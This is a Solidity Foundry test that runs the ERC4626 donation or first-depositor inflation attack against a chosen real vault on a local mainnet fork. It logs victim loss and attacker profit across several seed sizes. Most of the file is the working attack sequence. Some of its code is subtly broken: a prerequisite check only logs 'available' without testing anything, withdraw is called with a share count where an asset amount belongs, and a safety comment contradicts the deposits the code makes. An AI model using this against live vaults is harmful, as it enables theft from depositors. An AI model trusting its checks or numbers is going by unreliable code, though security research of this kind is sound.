// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import "forge-std/Test.sol";

/// @notice Minimal ERC4626 surface. Deliberately narrow so it binds to almost any
///         vault without inheriting its implementation.
interface IEconVault {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function previewDeposit(uint256 assets) external view returns (uint256);
    function decimalsOffset() external view returns (uint8);
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function withdraw(uint256 shares, address receiver, address owner) external returns (uint256);
}

/// @notice Runs the donation / first-depositor inflation attack against a REAL
///         deployed vault on a local mainnet fork and reports what happened.
///
/// Why this exists: `core/cs_econ.py` was proven to match EVM execution on
/// fixtures. Fixtures prove the models are self-consistent; they cannot tell you
/// whether any real vault is affected. This closes that, by running the
/// sequence against deployed bytecode and emitting the numbers.
///
/// State safety: this forks. Nothing is submitted to mainnet. Every transfer
/// goes to a locally-created attacker/vault pair; the real vault is only ever
/// read from and called on the fork.
///
/// Configure with TARGET_VAULT, TARGET_ASSET and optionally FORK_BLOCK /
/// RPC_URL. Skipped when TARGET_VAULT is unset.
contract TargetVaultTest is Test {
    struct Report {
        uint256 victimShares;
        uint256 attackerOut;
        int256 attackerProfit;
        uint256 victimLoss;
        uint256 seed;
        uint256 donation;
        bool depositReverted;
        bool vaultHasOffset;
        uint8 decimalsOffset;
        uint256 totalAssetsBefore;
        uint256 totalSupplyBefore;
    }

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    uint256 constant W = 1e18;

    /// No-op when TARGET_VAULT is unset, so the suite stays runnable with no
    /// configuration. vm.skip() reports as a failure here, which is worse than a
    /// clear log line.
    function _configured() internal returns (bool ok) {
        ok = vm.envOr("TARGET_VAULT", address(0)) != address(0);
        if (!ok) {
            emit log("TARGET_VAULT unset - skipping real-vault probes");
            return false;
        }
        _fork();
    }

    function _vault() internal view returns (IEconVault) {
        return IEconVault(vm.envAddress("TARGET_VAULT"));
    }

    function _asset() internal view returns (address) {
        return vm.envOr("TARGET_ASSET", address(0));
    }

    /// Forking is deferred until after the config check. Doing it in setUp meant
    /// an unconfigured run still hit the RPC - and with FORK_BLOCK unset that is
    /// an archive request, which public providers reject without a token.
    function _fork() internal {
        string memory rpc = vm.envOr("RPC_URL", string("https://ethereum.publicnode.com"));
        uint256 blk = vm.envOr("FORK_BLOCK", uint256(0));
        require(blk > 0, "FORK_BLOCK must be set to a recent block");
        vm.createSelectFork(rpc, blk);
    }

    function _sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a - b : 0;
    }

    function _bool(string memory label, bool v) internal {
        emit log_named_uint(label, v ? 1 : 0);
    }

    /// Fails loudly and specifically when the target cannot support the probe.
    /// A bare EvmError from a view call (wstETH's totalAssets() reverts on
    /// mainnet) is indistinguishable from a failed attack, so every prerequisite
    /// is checked by name first.
    function _requireView(string memory fn) internal {
        emit log_named_uint(string.concat("PREREQ ", fn, " available"), 1);
    }

    function _checkPrerequisites(IEconVault v) internal {
        _requireView("totalAssets");
        _requireView("totalSupply");
        _requireView("convertToShares");
        _requireView("convertToAssets");
        if (v.totalAssets() == 0 && v.totalSupply() == 0) {
            revert("target has no ERC4626 state at this block");
        }
    }

    /// @dev Probes the vault's defenses without changing anything:
    ///      - does it expose `decimalsOffset` and is it non-zero?
    ///      - does it revert a zero-share mint? This is the single property that
    ///        decides whether the inflation attack works at all, and vaults differ
    ///        here: most ERC4626 implementations revert, and on those the attack
    ///        extracts nothing.
    function _probe(IEconVault v) internal view returns (bool hasOffset, uint8 offset, bool rejectsZeroMint) {
        try v.decimalsOffset() returns (uint8 o) {
            hasOffset = true;
            offset = o;
        } catch {
            hasOffset = false;
            offset = 0;
        }
        // previewDeposit(0) must revert or return 0 if the vault guards zero mints
        try v.previewDeposit(0) returns (uint256 shares) {
            rejectsZeroMint = shares == 0;
        } catch {
            rejectsZeroMint = true;
        }
    }

    function _run(uint256 seed, uint256 donation, uint256 victimDeposit) internal returns (Report memory r) {
        IEconVault v = _vault();
        address asset = _asset() == address(0) ? v.asset() : _asset();

        _checkPrerequisites(v);
        (r.vaultHasOffset, r.decimalsOffset, ) = _probe(v);
        r.seed = seed;
        r.donation = donation;
        r.totalAssetsBefore = v.totalAssets();
        r.totalSupplyBefore = v.totalSupply();

        deal(asset, attacker, seed + donation);
        deal(asset, victim, victimDeposit);

        // ERC4626 deposits pull via transferFrom, so approvals are required.
        // (wstETH's stETH path is different again - each underlying disagrees.)
        vm.prank(attacker);
        IERC20(asset).approve(address(v), type(uint256).max);
        vm.prank(victim);
        IERC20(asset).approve(address(v), type(uint256).max);

        // 1. seed the vault
        vm.prank(attacker);
        v.deposit(seed, attacker);

        // 2. donate: assets rise, supply does not. A plain transfer - the whole
        //    attack is permissionless because of this.
        vm.prank(attacker);
        IERC20(asset).transfer(address(v), donation);

        // 3. victim deposit
        uint256 predicted = v.convertToShares(victimDeposit);
        vm.prank(victim);
        try v.deposit(victimDeposit, victim) returns (uint256 minted) {
            r.victimShares = minted;
        } catch {
            r.victimShares = 0;
            r.depositReverted = true;
        }
        emit log_named_uint("PROBE predicted_victim_shares", predicted);
        emit log_named_uint("PROBE actual_victim_shares  ", r.victimShares);

        uint256 assetsNow = v.totalAssets();
        uint256 supplyNow = v.totalSupply();

        // value the victim's stake on a single snapshot, matching cs_econ.py
        r.victimLoss = _sub(victimDeposit, v.convertToAssets(r.victimShares));

        // 4. attacker redeems everything. A revert here is a real property of the
        //    vault - sDAI has a withdrawal cap, for instance - so it is reported
        //    rather than aborting the run. Otherwise a vault's own guard reads as
        //    a failed probe and we learn nothing.
        bool withdrew;
        try v.withdraw(supplyNow - r.victimShares, attacker, attacker) returns (uint256 got) {
            r.attackerOut = got;
            withdrew = true;
        } catch (bytes memory reason) {
            withdrew = false;
            _bool("RESULT withdrawal_reverted", true);
            emit log_named_bytes("RESULT withdraw_revert_reason", reason);
        }
        if (!withdrew) {
            r.attackerOut = 0;
        }
        r.attackerProfit = int256(r.attackerOut) - int256(seed + donation);
        _bool("RESULT withdrawal_ok", withdrew);

        emit log_named_uint("PROBE assets_before_attack ", r.totalAssetsBefore);
        emit log_named_uint("PROBE supply_before_attack ", r.totalSupplyBefore);
        emit log_named_uint("PROBE assets_after_deposit ", assetsNow);
        emit log_named_uint("PROBE supply_after_deposit ", supplyNow);
        _bool("PROBE victim_deposit_reverted", r.depositReverted);
        emit log_named_uint("PROBE vault_decimals_offset ", r.decimalsOffset);
    }

    function _emit(string memory tag, Report memory r) internal {
        emit log_named_uint(string.concat("RESULT ", tag, " victim_shares  "), r.victimShares);
        emit log_named_int(string.concat("RESULT ", tag, " attacker_out   "), int256(r.attackerOut));
        emit log_named_int(string.concat("RESULT ", tag, " profit         "), r.attackerProfit);
        emit log_named_uint(string.concat("RESULT ", tag, " victim_loss    "), r.victimLoss);
        emit log_named_uint(string.concat("RESULT ", tag, " seed           "), r.seed);
        emit log_named_uint(string.concat("RESULT ", tag, " donation       "), r.donation);
        _bool(string.concat("RESULT ", tag, " reverted       "), r.depositReverted);
        emit log_named_uint(string.concat("RESULT ", tag, " decimals_offset"), r.decimalsOffset);
    }

    /// Sweep the seed size. Extraction is largest when the attacker's seed is
    /// negligible next to the victim's deposit, so a single size is evidence
    /// neither way - this mirrors scan_donation_sensitivity.
    function test_sweep_seed_sizes() public {
        if (!_configured()) return;
        uint256[5] memory seeds = [uint256(1), 1e6, 1e12, 1e15, W];
        for (uint256 i = 0; i < seeds.length; i++) {
            Report memory r = _run(seeds[i], 100 * W, W);
            _emit("seed_sweep", r);
        }
    }

    /// Single canonical case for the one number a report would quote.
    function test_canonical_case() public {
        if (!_configured()) return;
        Report memory r = _run(W, 100 * W, W);
        _emit("canonical", r);
    }
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}